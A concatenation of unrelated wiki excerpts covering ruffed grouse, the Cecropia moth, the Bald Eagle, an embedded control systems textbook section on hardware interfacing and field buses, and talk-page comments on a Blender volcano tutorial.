The male is often heard drumming on a fallen log in spring to attract females for mating. Females nest on the ground, typically laying 6-8 eggs.  Grouse spend most of their time on the ground, and when surprised, may explode into flight, beating their wings very loudly.

The caterpillars of the '''Cecropia Moth''' feed on a wide range of trees and shrubs. The adult is one of the largest moths found in North America, and females with wingspans that are 75 mm or more have been documented. It is found throughout the Eastern part of the continent, and as far west as the Rocky Mountains and north into the maritime provinces of Canada. The larvae of these moths are most commonly found on Maple trees, but they have been known to feed on Wild Cherry and Birch trees among many others.

==Description==
Caterpillars are dark-colored and hairy, adults a large moth.

==Symptoms and Signs==
Foliar damage may be severe if large numbers are present.

==Ecology==
[[Image:Hyalophora cecropia emerge.jpg|thumb|An adult male cecropia stretching its wings after emerging from its cocoon]] 
The life cycle of the moth is much like any other saturniidae species. It lays oval-shaped, light brown eggs on the leaves of the host plant. When the eggs hatch, small black and hairy caterpillars emerge (first instar), and eat their eggshells.Sometimes the newly hatched caterpillars have yellow bristles, which darken in a few minutes. As the caterpillars age, they molt 5 times. The second instar is yellow-green with black spots and spiny orange, yellow and blue knobs. The third and fourth instars have smaller spines, and are similar to each other. The fifth instar is a whitish color with bright yellow, blue and red knobs. The caterpillars feed heavily on their host plant and can grow up to five inches long. They then spin cocoons of brown silk, usually wrapped in leaves of the host plant. They then pupate inside the two-layered cocoon. There is only one brood per year, the cocoon overwintering and emerging in spring. When the adults eclose, they have to pump fluid into their wings to extend them. The females emit pheromones at night, which the male can detect with its large, bushy antennae. Males can fly for miles in order to reach a female. The moths mate, and the female spends the remainder of her life laying eggs, while the male may mate several more times. Because the adult moths do not have mouth parts they are unable to eat. As a result, the lifespan for an adult Cecropia moth is generally only 7 to 10 days in the wild, perhaps a little longer or shorter, depending on how much movement the moth makes. For instance, if temperatures are cooler, the moth may remain mostly inactive, which will increase its life. In captivity, this lifespan can be extended to about a month by placing the moth in the fridge directly after it hatches and its wings are dry. (Those who intentionally rear the moths may find this necessary to synchronize mating.)

Differentiating between genders of this species is very easy. The most obvious difference is the plumose antennae. Males will have a very bushy antenna while females will have a moderately less bushy antenna. Another difference is that the females will be slightly larger in the abdomen due to carrying eggs. Male's abdomens are also more angular than the female's abdomens which are more rounded.

| description = The '''Bald Eagle''' ('''Haliaeetus leucocephalus''') is a bird of prey found in North America, most recognizable as the national bird of the United States. 

The species was on the brink of extinction in the US late in the 20th century, but now has a stable population and is in the process of being removed from the U.S. federal government's list of endangered species.  

An immature Bald Eagle has speckled brown plumage, the distinctive white head and body developing 2-3 years later, before sexual maturity. This species is distinguishable from the Golden Eagle in that the latter has feathers which extend down the legs. Also, the immature Bald Eagle has more light feathers in the upper arm area, especially around the 'armpit'.

Adult females have an average wingspan of about 7 feet (2.1 meters); adult males have a wingspan of 6 ft 6 in (2 meters). Adult females weigh approximately 12.8 lb (5.8 kg), males weigh 9 lb (4.1 kg). The smallest specimens are those from Florida, where an adult male may barely exceed 5 lb (2.3 kg) and a wingspan of 6 feet (1.8 meters). The largest are the Alaskan birds, where large females may exceed 15.5 lb (7 kg) and have a wingspan of approximately 8 feet (2.4 meters).

Bald Eagles are powerful fliers, and also soar on thermal convection currents.

In the wild, Bald Eagles can live about 20-30 years, and have a maximum life span of approximately 50 years. They generally live longer in captivity, up to 60 years old. 

Bald Eagles normally squeak and have a shrill cry, punctuated by grunts. They do not make the &quot;eagle scream&quot; as often shown on the television.  What many recognize as the call of this species is actually the call of a Red-tailed Hawk dubbed into the film.

Bald Eagles build huge nests out of branches, usually in large trees near water. The nest may stretch as large as eight feet across and weigh up to a ton (907kg). When breeding where there are no trees, the Bald Eagle will nest on the ground. 

Eagles that are old enough to breed often return to the area where they were born. An adult looking for a  site is likely to select a spot that contains other breeding Bald Eagles. 

Bald Eagles are sexually mature at 4 or 5 years old. Eagles produce between one and three eggs per year, but it is rare for all three chicks to successfully fly. Both the male and female take turns sitting on the eggs. The other parent will hunt for food or look for nesting material.

== Preface ==

{{SideBox|This book is a '''wiki''', and is therefore open to be edited by anybody. Feel free to help out and contribute to this book in any way, but please try to maintain the scope of this book, i.e., its emphasis on '''design'''.}}

{{PDF version|Embedded Control Systems Design|XXX KB|Embedded Control Systems Design}}
--&gt;

This is a textbook at the level of university [[w:Master of Science|Master]]'s or [[w:Postgraduate education|graduate]] students in Engineering ([[w:Mechatronics|Mechatronics]],
[[w:Mechanical Engineering|Mechanics]], Electrical/Electronics, [[w:Computer Science|Computer Science]], [[w:Systems Engineering|Systems Engineering]]), that
explains how to design ''motion control systems'', that is,
computer-controlled machines with important moving parts, such as
[[w:robot|robots]],  [[w:Machine_tool|machine tools]], [[w:automobile|cars]], [[w:Bus (vehicle)|bus]]es, [[w:airplane|airplanes]], [[w:ship|ships]], [[w:satellite|satellites]], [[w:telescope|telescopes]], etc.

The emphasis of the book lies on the '''[[w:design process|design]]''' of embedded systems, and
much less on the technical details in the systems. (Such details are often
covered already in the many Wikipedia articles about the systems'
components.) In other words, the book focuses on the [[w:systems thinking|'''systems level''']]
thinking that the engineer should do when designing a new embedded
application (or redesigning/improving already existing systems). In many places, the book provides a motivated list of ''things to think of'', &lt;em&gt;do's and don'ts&lt;/em&gt; and ''best practices'' in the design of a system from individual components. The book also tries to bring some
structure and classification into the tremendously large variety of
embedded systems and their [[w:design process|design process]]: designing a new vending machine brings very different challenges than the design of an automated luggage handling system in a large airport, or than the development of a new generation of [[w:football|football]] playing [[w:robot|robot]]s.

Readers should learn from this book what design criteria (technical, economical, social, etc.) are ''relevant'' for specific embedded systems, and what trade-offs are ''appropriate'' in different categories of embedded systems. In addition, the book should help readers to estimate the [[w:complex system|'''complexity''']] of the system they want to develop, and to identify where this complexity comes from in their specific application. Coping with system-level complexity is a major [[w:Non-functional requirements|non-functional requirement]] behind all embedded systems design and development, since it is the key factor that defines how many resources (time, people, hardware, software,…) will be needed to bring the project to a successful end.

At the moment, this book focuses mainly on ''motion'' machines only, where the control is needed to make the machine move in a specified and safe way. So, its scope currently does not include other embedded control systems, such
as process or temperature control, video and audio signal processing,
telephony, etc. Future enhancements in these directions are certainly welcome, although motion control systems typically offer extra design challenges with respect to the mentioned [[w:Consumer electronics|consumer electronics]] kind of embedded systems—in that they have to cope with the real physical world and not just with the digital, man-made world—so their design aspects are typically a superset of what is found in consumer electronics.

Motion control systems involve software control components, but also computer-readable ''[[w:Model-driven engineering|models]]'' to represent the physical world, [[w:sensor|sensors]] (partly hardware, partly software) to measure that physical world, [[w:actuator|actuators]] (partly hardware, partly software) to induce changes in the world, and ''planners'' (pure software) to precalculate which actions the control system should take in order to reach a desired state.

''Embedded'' can mean many different things (see a [[Embedded_Control_Systems_Design/Properties_and_design_criteria|later chapter]] for a list of meanings), but a common characteristic is that the system's complexity—including all its configuration and control components and activities—are not made visible to the user of the systems, but remain
hidden behind a ''user friendly'' interface that gives only access to the (virtual) model of the
embedded system.

[[Embedded_Control_Systems_Design/A_design_example|This example]] of an embedded system is used to introduce the most generic concepts of an embedded system, and to motivate the relevance of the later chapters in this book.

This chapter looks at the hardware components (except the processor
architectures, discussed in another chapter) that occur in the embedded
control systems this book focuses on. More and more, the components
discussed in this chapter are not pure hardware anymore, but become
embedded systems in themselves, with a growing amount of software
functionalities.

The focus is not on the technical
details of how this hardware works, but on the information that the systems
design engineer needs to make appropriate choices.

* Buses (electrical, EMC, protocols)
* AD/DA
* Digital IO (input, output)
* PWM (Pulse Width Modulation)
* Motor amplifier
* Encoders, resolvers, Hall sensor

== I/O modules ==
In most embedded systems a lot of different types of hardware are all connected to each other.  This connection is usually done either mechanically or by using a voltage (sometimes also current) signal over a cable.  
Typical embedded systems tend to have a lot of different cables with signals, coming from different locations, but going to the same controller.
These controllers, on the other hand, only have a few I/O ports.
I/O modules have a large number of (mostly digital) inputs and outputs, depending on the type.
Communication between the I/O module and the controller occurs through one connection over which both the inputs and the outputs are sent.
The I/O module doesn't change the signals on this connection, it only edits them (in a reversible way) such that they can be sent using only one connection.  
Depending on the type of I/O module, the signals should first go through a ADC/DAC, before being passed on to the I/O module.

The I/O module and the controller typically communicate over a &quot;twisted pair&quot; of wires.
The other kinds of connections, and the technical details of the signaling protocol, are outside the scope of this book.
If you want more details, see [[Embedded Control Systems Design/Field busses]], [[Robotics: Computer Control: The Interface: Networks]], and the [[serial communications bookshelf]].

== Signal converters ==

=== Analog-to-digital converters ===
[[Wikipedia:Analog-to-digital|Analog-to-digital converter]]s (or ADCs) convert an analog input signal (generally a voltage signal) to a digital number.
This is a crucial step in hardware interfacing.
The practical choice of a converter depends on the desired resolution (mostly 6-24 bits).
ADCs are usually preceded by a sample and hold circuit, which samples the input voltage (at the [[Wikipedia:Sampling rate|sampling rate]]) defined by the clock signal and then holds that value for a short time.  

Several sampling errors may occur, but can be easily avoided by looking up the device's specifications.
[[Wikipedia:Quantization noise|Quantization noise]] is caused by the finite resolution of the ADC.  It is an unavoidable kind of noise, but can be reduced to almost any level by using a higher resolution.
Thus the signal-to-noise (quantisation noise at least) ratio depends entirely on the resolution.

A second common error is [[Wikipedia:Aliasing|aliasing]].
Aliasing is due to the finite sampling rate of the sample and hold circuit.
If high frequency content is present in the signal (and there always is high frequency noise, for example) then the ADC can not deal with this correctly.
When aliasing occurs, this high frequency content, which one might expect to be cut off, will alter the low frequency (and thus desired) content of the signal. 
In principle, aliasing is avoided when the sampling frequency is higher than the [[Wikipedia:Nyquist frequency|Nyquist frequency]] (twice the bandwidth of the input signal).
To avoid influence by high frequency noise, and to make the ADC more robust, the input signal can also be [[Wikipedia:Low-pass filter|low-pass filtered]] before the conversion takes place.

=== Digital-to-analog converters ===

[[Wikipedia:Digital-to-analog|Digital-to-analog]] conversion is a lot like analog-to-digital conversion.

Bandwidth restrictions are determined by the maximum switching speed, and thus the maximum speed at which a digital signal can be processed.  These restrictions are entirely due to the nature of the circuit, and cannot be altered.
The DAC output is usually a piecewise constant function ([[Wikipedia:Zero-order hold|zero-order hold]]).
The output value is determined by the digital input and the clock signal.
It is held during a clock period, which leads to sharp corners, and thus high-frequency content.
The DAC is followed by a [[Wikipedia:Low-pass filter|low-pass filter]].

=== Digital-to-digital converters ===

[[Wikipedia:Digital-to-digital converter|Digital-to-digital conversion]] is another possibility.
With or without getting a clock signal supplied from the controller, small converters can perform a lot of simple operations on digital signals.  Changing the bit depth or sample rate are among the possibilities.  
Whether or not there is a need for a separate wire to the controller for the clock signal depends on the type of operation, and also on the line code.  Not having to draw a wire to every digital to digital converter in the system can be quite an advantage.  [[Wikipedia:Manchester_code|Manchester code]] for example allows for easy extraction of the clock signal, and can thus be used in digital to digital converters that perform virtually any type of operation.
This type of coding (or supplying a clock signal) can be used to perform complex calculations and operations far beyond a simple conversion.


== Sensors ==

Sensors measure the system outputs and present them as inputs to the controller.
Often the signal that a sensor generates is too weak, or needs to be modified before it can be transmitted.  
Effects to be taken into consideration are the in-and output impedances, the linearity of the sensors and the amplifiers, limiting the influence of cable length and other disturbances, etc.  
Different types of circuitry have been built to deal with these issues.  A lot of sensors are bundled with this equipment, often in the same housing.  Commercial packages are also available that contain the required devices to hook up to the sensor.
These (mostly) electronic devices are mostly made out of operational amplifiers, transistors and RLC circuitry.  Comparators, high, low and band-pass filters, source-followers and all kinds of amplifiers are made out of these components.

=== Rotary encoders  ===

There are two types of [[Wikipedia:Rotary encoder|rotary encoder]]s: absolute and incremental encoders.

''' Absolute rotary encoders '''

An absolute encoder measures the angular displacement.
Its output is a digital signal.
The resolution is restricted and determines the accuracy of the complete embedded control system.
This encoder can be directly connected to the controller (because of its digital output).
Analog versions, such as potentiometers, output an analog signal and thus require an ADC between their output and the controller.

''' Incremental rotary rotary encoders '''

These encoders measure the relative angular displacement.
The resolution is, as always, restricted.
They output a pulse each time a certain angular displacement takes place.
The resulting signal is analog, and has a DC-component.
The output is unclocked, which means the sample frequency is not predefined.
The rotational speed is measured by the distance between the output pulses.
An additional counter that counts the pulses and generates a digital output signal is needed.
Several (more expensive) encoders come with this extra piece of hardware built-in.
They are as easily connected to the controller as encoders of the absolute type.

Both types of rotary encoders require a feeding signal, on which the output amplitude depends.
A digital output signal is relatively insensitive to noise, which means a small amplitude will do the trick.

=== Resolvers ===
[[Wikipedia:Resolver (electrical)|Resolver]]s do exactly the same as absolute digital encoders, but output an analog signal.

=== Tachometers (Hall effect sensors) ===
A [[Wikipedia:Hall effect sensor|Hall effect sensor]] is a type of [[Wikipedia:Tachometer|tachometer]], used for measuring angular speed.
Both the output voltage and frequency are proportional to the angular velocity. It thus produces an analog output signal, more or less like that of incremental encoders.

Other types of tachometers include, for instance, a simple DC-generator, which generates a voltage, proportional to the motor angular velocity, across its main leads.

=== Proximity sensors  ===
Proximity sensors allow the user to measure the distance to or the presence of an object. Proximity sensor work in a lot of different ways.

'''Types of sensors'''

*Ultrasonic
*Magnetic
*Capacitive
*Radar
*Sonar
*Reflective
*Laser
*...

== Filters ==
Hardware filters are used to reject noise from a measured signal. Most common are [[Wikipedia:Low-pass_filter|low-pass]], [[Wikipedia:High-pass_filter|high-pass]], [[Wikipedia:Band-pass_filter|band-pass]] and [[Wikipedia:Band-stop_filter|band-stop filter]]s. Filtering obviously only improves the signal-to-noise ratio when the frequency range of the signal differs from that of the noise.

== Actuators  ==

=== Electrical motor drives ===

Commercial motor drives are easily configured.
A drive can be analog or digital.
A software version that runs on the controller's microprocessor is another possibility.
There is always need for a module that converts the feeding signal according to the (small) input signal.
Commercial drives have these built-in.
Several types of these modules exist: pulse width modulators, choppers. These modules make use of [[Wikipedia:Thyristor|thyristor]]/[[Wikipedia:Transistor|transistor]] switches.
In the past, thyristors were more widely used, but now transistors ([[Wikipedia:MOSFET|MOSFET]]/[[Wikipedia:IGBT|IGBT]]) are more popular (in low and medium power applications, that is).
Thyristor circuits are still frequently used in more powerful applications (in the order of several megawatts), though.
E.g.: wind turbines.

The feeding signal may need to be transformed and converted to DC, or shifted in phase, before it is presented to the motor itself.

The start-up of alternate current induction motors leads to a large current peak.
This is never the case in normal use, but it might cause problems after a sudden power shut-down.
A special start-up device that is switched off when a certain speed is reached, can resolve this possible problem.
It may also be considered within the control system itself.
The hardware then remains unchanged.
Both the input signal and the feeding signal can be filtered to avoid excessive motor noise.

=== Stepper motors ===

[[Wikipedia:Stepper motor|Stepper motor]]s are often used in positioning systems.
The controller sends the desired number of steps to the motor, in which transistor switches are turned on or off in the appropriate order.

=== Pneumatics and hydraulics ===

Pneumatic and hydraulic circuits make use of fluids (resp. gasses and liquids) under pressure.
These can be present outside of the control system and fed to it.
The pump or compressor can also be a part of the embedded system itself.
It is then controlled by the controller.
Pneumatic and hydraulic circuits consist out of [[Wikipedia:Valve|valves]] that are driven by a mechanism, an electrical current (solenoid valve) or another pneumatic/hydraulic circuit.

''' Mechanism driven valves '''

Pneumatic/hydraulic valves can be driven by a mechanism or a cam-follower system.
The mechanism's purely mechanical structure forms the base of a self-controlling scheme.
There is little interaction with the controller.  The rotational speed of the cam, or a given movement of a branch in the mechanism can be controlled, but the shape of the cam or the mechanism determines the movements of the valves. E.g.: a pneumatic [[Wikipedia:Finite state machine|Finite State Machine]].
The dynamics are restricted by the bandwidth of the spring (in a cam-follower system) and/or the valves themselves (depending on the type).

''' Solenoid valves '''

[[Wikipedia:Solenoid valve|Solenoid valves]] can also be used.
A fast response, and thus, a large force, is often desired.
This leads to large currents.
A certain feeding signal is required.
This is taken care of by a power circuit with, among many other devices, a current transformer in it.
The currents used are large, but the power is not.
These circuits are thus different from the ones used in motor drives, where the power consumption is much higher.
The dynamics are restricted by the bandwidth of the valves, which is a lot lower than that of the electrical components.

When dealing with high pressures and large flows, several cascaded valves are used.
The first one is then driven electrically or mechanically, and then, in its turn, uses the fluid under pressure to drive the next one.

''' Driving of the valves '''

Most of the time, the valve blocks are driven by the central controller, through busses and substations.
This is especially the case in larger, industrial systems.
Such a hierarchical system is quite clear and allows for the design of very complex structures.
There is also the possibility of a real mini-ECS: a controller with 'built-in' valve block.
This last solution is compact and works on its own. E.g.: the [[Wikipedia:Anti-lock braking system|anti-lock braking system]] (ABS) in cars.

== Practical aspects of hardware interfacing ==
In order to clearly decouple the useful data from noise, good interfacing is necessary. When cabling is done improperly, electrical noise from the nearby environment can easily be introduced in the circuit. Therefore much attention is needed when making interconnections.
In this text, the reader can get a feeling with some common problems about interfacing. At the end, there is a section with some general tips.
===Sources of noise===
====Interference noise due to a common impedance====
If two circuits have a current path in common, that common path could couple signals of those circuits due to its impedance. This often happens when several circuits use one single path to return current to their power supplies.

[[Image:Common impedance.png|600px]]

A current transient in a digital circuit (when switching logic state) will briefly shift the “ground” reference for the analog circuits.This problem is more important in analog circuits, because of the absence of &quot;noise immunity&quot;. Digital systems are -upon a certain level- less sensitive for these effects.

====Interference noise due to capacitive or electrostatic coupling====
Between any two conductors in a system, there exists a capacitance if the space between them is filled with a dielectric insulator. If the receiving circuit has a large resistive impedance, the related noise signal is affected by the noise signal of the source. This effect is more important at high frequencies.
To avoid this electrostatic coupling, the best method is to use an electrostatic shield. In this way the entire circuit is enclosed by a metal screen. From the principle of the 'Faraday cage' follows that the influence of external voltages will be zero inside the shield. A problem is that there will be a stray capacitance from this shield to every conductor within. This reduces its effectiveness.
It is clear that this problem will not occur when the digital and analog grounds are kept separate.

====Interference noise due to inductive coupling====
Two conductors which are close together may have a significant mutual inductance between them. An alternating current in the power circuit then induces a series mode interference voltage in the input circuit. This inductance depends on the geometry of the two circuits, namely on the overlapping length and separation. Inductive coupling will occur even if the measurement circuit is completely isolated from earth. To twist the conductors is the simplest way to reduce the effects of inductive coupling to an external interference. This arrangement is commonly known as twisted pairs. The magnitude of the interference voltage induced in a given loop is proportional to the area of the loop and the rate of change of the external magnetic field. The sign of the induced voltage depends on the orientation of the conductors. In the ideal case of both loops having the same area and experiencing the same magnetic fields, there is a zero resultant induced voltage.

[[Image:twistedpairdiss.jpg]]

===Input section isolation===
Isolation amplifying is often used in combination with sensors, because sensors are often weak and sensitive components. An isolation amplifier has a fixed differential gain over a wide range of frequencies, high input impedance, and low output impedance. In addition to that, an isolation amplifier's input is separated from its output and power supply. This way the sensitive and weak input component is secured. Often used techniques for isolation are electromagnetic isolation and optical isolation.
====Electromagnetic isolation====
An electromagnetic isolation couples an amplified signal between circuits through an air-core transformer. The signal is first modulated on a higher frequency. The air-core transformer blocks the low frequency components (like the DC and 50Hz power supply). After the signal is transmitted through the transformer, it is demodulated and amplified again. In addition a second transformer can be used to supply the first circuit of power, this way no batteries are needed.

[[Image:Electromagnetic.png]]

====Optical isolation====
When optical isolation is used, the transmitted signal is first modulated and then send by a solid-state photo emitter to the photo detector of the second circuit. This way, both circuits are completely electrically decoupled. But this approach requires a battery to be included in the emitting circuit.

===Tips and tricks===
*Since mutual inductances and coupling capacitances between measurement and power circuits are inversely proportional to the distance between them, this distance should be as large as possible.
*Every current that comes from a power source must go back to that power source
*Every conductor has a finite resistance and impedance, this means that a 'ground' conductor could contain a DC shift and voltage spikes.
*Check your power supply for voltage spikes with an oscilloscope while the circuit is running.
*Circuit boards can have a 'ground plane', use it as a electromagnetic shield and not as a conductor to return current.{{citation needed}}
*The power supply should be heavily wired to minimize voltage drops.
*Use capacitors (from 1 to 100 microF) between the power supply conductors and their ground return conductors. Hereby the supply voltage is stabilized for external interference (50Hz to 1MHZ) and short voltage drops.
*Use Mylar capacitors across voltage supplies of digital circuits to minimize the effect of short surges of current. Put them also across analog chips that have to be protected form these surges.

This chapter looks at the inter-system communication components 
that occur in the embedded motion systems this book is focusing on.

* Serial lines
* Controller Area Network (CAN)
* Profibus
* Realtime ethernet (RTnet, EtherCat, ProfiNet...)
* Devicenet
* Inter-Integrated Circuit (I2C)
* Serial Peripheral Interface (SPI)
* Firewire


==Description==
A '''field bus''' is a part of a system which provides the communication between several components in that system (for example an actuator or a sensor). A bus is a cable with an interface on the two ends . A bus system is a collective noun for all buses, this means that there is a distinguish between: 

* Factory buses (or a factory network)
* CPU buses
* [[w:Fieldbus | Field busses]]

===Factory buses===
A factory bus supports the management. The data of consequence for planning, logistic, quality, etc. will be sent over this network. A factory bus has been developed especially for the connection between several computers (for example: PCL, VME, etc.).

===CPU buses===

===Field buses===
Three communication types exist for field buses, namely [[w:Serial_communications | serial]], [[w:Parallel_bus | parallel]] and [[w:Wireless | wireless buses]]. The difference between serial and parallel field buses is principally the quantity of data that can be sent in one cycle. For a serial bus the process of sending data is one bit at one time. This is in contrast to parallel communications, where all the bits of each symbol are sent together. Wireless field busses are nowadays still in development. Because of this, the use of wireless field buses is limited in control systems.

==Why not use the same network everywhere?==
Networks such as [[w:TCP/IP | TCP/IP]] and Novell have already been on the market for a long time. Much software has been developed for it, and the paediatrics diseases are already solved. Field buses are still “young” networks which are aimed, in contrast to standard networks, to transport small quantities of information. Field busses need less hardware than standard networks. Because of this, they can be incorporated in the smallest sensors and actuators. Field bus applications secure special requirements to the hardware, for example intrinsic safe, voltage supply over the network, very high protection against electric jamming, galvanic separation, control at several places, etc.

The operation of the network program can be described by the '''OSI layer model'''. 
The OSI, or '''Open System Interconnection''', model defines a network frame for implementing protocols in 7 layers. Control is passed from one layer to the next, starting at the application layer in one station, proceeding to the bottom layer, over the channel to the next station and back up the hierarchy. 


In each of these layers there are certain rules. Two computer systems that want to make contact with each other, must keep themself to these rules. Otherwise there will be misunderstandings and the communication between both will go wrong. 



'''Transport:'''

===Layer 1: Physical=== 
In this layer is described which sort of cable (serial/parallel/wireless) with which bit rate is used. This layer conveys the bit stream through the network at the electrical and mechanical level. Fast Ethernet and RS232 are protocols with physical layer components.

===Layer 2: Data link=== 
This layer fixes how and at which moment a message from a computer to another computer can be sent over the same cable. Also defining the addresses and the format of the messages belongs to the agreements of this layer. The data link layer is divided into two sub layers: The Media Access Control (MAC) layer and the Logical Link Control (LLC) layer. The MAC sub layer controls how a computer on the network gains access to the data and permission to transmit it. The LLC layer controls frame synchronization, flow control and error checking.

===Layer 3: Network=== 
This layer provides switching and routing technologies, creating logical paths, known as virtual circuits for transmitting data from node to node. If several networks are put together it is necessary to make agreements:
-How does the general addressing happen and on how is the route chosen that the message must follow?

===Layer 4: Transport=== 
This layer provides transparent transfer of data between end-systems, or hosts, and is responsible for end-to-end error recovery and flow control. In this way we obtain a reliable network connection. It ensures complete data transfer.


'''Application (control systems):'''

===Layer 5: Session=== 
This layer establishes, manages and terminates connections between applications. 
There are three kinds of sessions in the OSI-model:
- ‘one way’: the information will be sent in one direction.
- ‘two way simultaneously’: both participants can send and receive at the same time (full duplex).
- ‘two ways alternate’: both sides can various send and receive (half duplex).

===Layer 6: Presentation=== 
This layer provides independence of differences in data representation (e.g., encryption) by translating from application to network format, and vice versa (for example: from ASCII to EBCDIC).

===Layer 7: Application=== 
This layer specifies which applications are available to the user. Everything at this layer is application specific. The user programs are situated in this layer with which you can read files on another computer, run a process, etc.

==Typical usages of field buses at the application levels==

There are several typical usages of field buses, the differences are mainly in the way they handle information. The different types in control systems are: 

*'''Remote I/O''' (central controllers, distributed sensors, machine tools with CAN I/O):
This type of field bus acts as a multiplexer. The data bits are offered to the network and further transported to the outputs elsewhere in the network. 
*'''Master/slave''' (master controller, distributed slave controllers)
The master can send a task to the slave via the bus. The slave processes this task and gives an answer. Slaves can’t communicate mutually. 
*'''Client/server''' :
A field bus with several masters. A client gives a task to the server. These will carry out the task first and answer afterwards. A station can be both client and server at the same time and so they can send several tasks at the same time. 
*'''Consumer/producer''':
A field bus with several masters where each consumer station is interested in a certain piece of data, while the producer station provides the information to the consumer that wants to subscribe to the producer data.

==Field bus protocol==

The field bus interface encodes the commands or the state of an in- or output to digital information which is arranged for transport over the cable. 

==Properties of field buses==

* Short response time
* Large reliability
* Cheap wiring
* Open standards
* Simple protocols
* Low price per connection


'''Response time:'''

In real time: deterministic response time (for example CAN)

-very short response time:
For the link PLC - periphery
Examples: Profibus DP, CAN and Interbus-S.

-average response time:
For the link PLC - supervision system
Example: Profibus FMS


'''Wiring for field busses:'''

The trend is as follows:

* parallel -&gt; serial -&gt; wireless:


-previous coax (Ethernet cable)


-often RS485

advantages: cheap, easy to install

disadvantage: no high speeds


-also glass fiber

advantage: large distances possible


'''Open standard'''

-why:

To make communication possible between heterogeneous systems from different vendors that exists for different OSI layers

-Examples: 

DIN 19245 (Profibus), IEEE 1118 (Bitbus) ISO/DIS 11519-1 AND ISO/DIS 11898 (CAN)


*field bus with layer 1 and layer 2 &lt;br&gt;
-protocols in hardware or software &lt;br&gt;
-applicable in devices &lt;br&gt;
-not arranged for link of heterogeneous devices &lt;br&gt;
-Example: CAN &lt;br&gt;


*field bus with layer 1, layer 2 and layer 7&lt;br&gt;
-more complex protocols in software&lt;br&gt;
-arranged for link of heterogeneous apparatuses&lt;br&gt;
-Example: Profibus-FMS&lt;br&gt;

==Topology==

The construction of a network that is built by some field buses can take several physical forms. Such a form is called a topology of a network. Some examples of different topologies are:
* [[w:Star_network | Star]]
* [[w:Bus_network | Line]]
* [[w:Tree_%28graph_theory%29 | Tree]]
* Mono-master
* Multi-master

==Advantages of field buses==

* Only a few cables necessary 
* No problems with 4-20 mA conversion (direct communication with PLC or PC.) 
* More intelligence possible in equipment 
* Simple to extend without extra wiring 
* Maintenance and jamming can be searched through the network 
* Digital technique

==Disadvantages of field buses== 

* There is not yet a standardization of the user interface
* Sometimes you must contact several manufacturers for support when you have got a problem


==Aspects to consider when choosing a field bus==

* The maximum bus length (see overview)
* Number of clients
* Data rate
* Topology
* Price
* The time (difficulty) to add/remove a client
* The maximum cycle time
* Compatibility between the different field buses
* Stability of the system
* Applicability for communication between controllers, PC’s, and/or intelligent equipment
* Availability of interface cards for PC’s
* Maximum number of repeaters
* Maximum number of nodes without using repeaters
* Maximum number of nodes with use of repeaters
* Maximum data in one message
* Maximum number of masters

==The most used different field buses==

* [[w:INTERBUS | Interbus]]
* [[w:Profibus | Profibus]]
* [[w:Controller_Area_Network | CAN]]
* [[w:Ethernet | Ethernet]]
* [[w:EtherCAT | EtherCAT]]
* [[w:AS-interface | AS-Interface]]
* [[w:DeviceNet | DeviceNet]]

==Overview of the most used bus systems==

Bus systems have been developed mostly to be used in a certain scope. In the table below an overview is given along with the specifications of the different bus systems.

      <text xml:space="preserve">I was wondering, in part of the tutorial when you tell us to subdivide the plane, do you mean for us to subdivide it 5 - 8  time or did you mean to say 15 - 18 times? When I tried 5 - 8 times my volcano did not look like what you had in the picture. When I tried to work with it it did not work very well. Is this an error or is 5 - 8 times what you ment?

-jfireball66

Hi, I was thinking of continuing this tutorial, however I wanted to see if anyone will continue to complete this, or if I have a &quot;go ahead&quot; on this project. If I recieve no resistance by this Monday (March 26th 2007) then I shall attempt to finish this tutorial. 

-Spiffy


I think this page needs serious rebuilding. I think using a method similar to 'mountains out of molehills' would be much better than sculpt mode. I think sculpt mode would be a little much for a newbie.
I'm going to go ahead and start to work on it that way. [[User:Hobo Joe|Hobo Joe]] 21:27, 13 June 2007 (UTC)


I started rewriting this tutorial, it will be finished in some days. [[User:Morrolan|Morrolan]] ([[User talk:Morrolan|talk]]) 15:41, 27 August 2009 (UTC)


Ok, Tut is now in a acceptabe state so I will link it to the main page. There are a little bit too much images, I know, but I think for a newbie tutorial this is ok. As soon as I'm better with particle-systems I will add a new section, how to add real magma. If someone could search for misspellings and incorrect sentences this would be a big help for me. [[User:Morrolan|Morrolan]] ([[User talk:Morrolan|talk]]) 17:37, 31 August 2009 (UTC)

I've edited some of the tutorial for spelling and clarity. I will probably do a bit more work on it in that direction, and may also rewrite the texture section with a quick realism increase. For magma, I would recommend a fluid simulation, although the volcano is too complex to use fluid sim on (too many vertices). I'll see about writing that. ---- [[User:Illusionist|Illusionist]] ([[User talk:Illusionist|talk]]) 23:26, 1 September 2009 (UTC)



Thank you for correcting my tutorial. :) I wil probably add some smoke to our volcano in the next days. [[User:Morrolan|Morrolan]] ([[User talk:Morrolan|talk]]) 16:12, 5 September 2009 (UTC)


I think too many things are being assumed for the user. the texture setting was not previously covered and took time for me to figure out based on an image where it was. &quot;Enter Edit-mode and subdivide [w-subdivide multi] it about 50 to 80 times.&quot; where the heck is &quot;w-subdivide multi&quot;? the shape of the cone inside the volcano  also affect lighting tremendously. [[User:Dracozny|Dracozny]] ([[User talk:Dracozny|talk]]) 21:53, 13 October 2009 (PDT)


Perhaps you're right. The texture-section is crap, I know, I'll see about rewritng or deleting it.

The lighting isn't really good but for a tutorial for &quot;Noobs&quot; its ok I think. ;) If you want, feel free to improve it.

[w-subdivide] is probably a bit misleading, I'll correct it.
[[User:Morrolan|Morrolan]] ([[User talk:Morrolan|talk]]) 11:35, 18 October 2009 (UTC)

Hi, absolute noob here. I was working my way through the tutorial and came close to crashing the program. I'm pretty sure I had too many subdivides which is what brought me here. As a beginer,  it is best to tell me how many times to press the button. I also scaled the plain though it didn't tell me to. I'm not sure if that was right or not but it was part of the directions for the last project. I disagree it needs more info on how to start the project. Maybe just a warning that this tutorial assumes information learned in pervious tutorials like many of them do. Just my two very noobish cents.

** A little more detail in the lighting please **
I'm going through the book from the beginning. This chapter has the first mention of lighting as far as I can remember. As such, you should tell the user how to add a lamp. You've simple said: add a lamp (spot). I have no idea where I go to add a lamp.  We also have not yet learned to manipulate the camera or render. Chances are that the camera is not taking in the whole scene if and you won't see the crater if it is still set to its default position. Some of us are total noobs here.

Oh, that's bad, thank you for informing me about these things. Sorry I didn't read it sooner, but I'm a little bit short on time at the moment.
I'll try explain something a little bit clearer if I find some time. (hope in the next few days) [[User:Morrolan|Morrolan]] ([[User talk:Morrolan|talk]]) 10:10, 24 January 2010 (UTC)

This is much harder than the previous tutorial pages, it implies a bit of knowledge that noobs wont know (i'm a noob, took me a bit to even add a light) and skips alot of stuff like textures and resizing the spot light -AdamK117

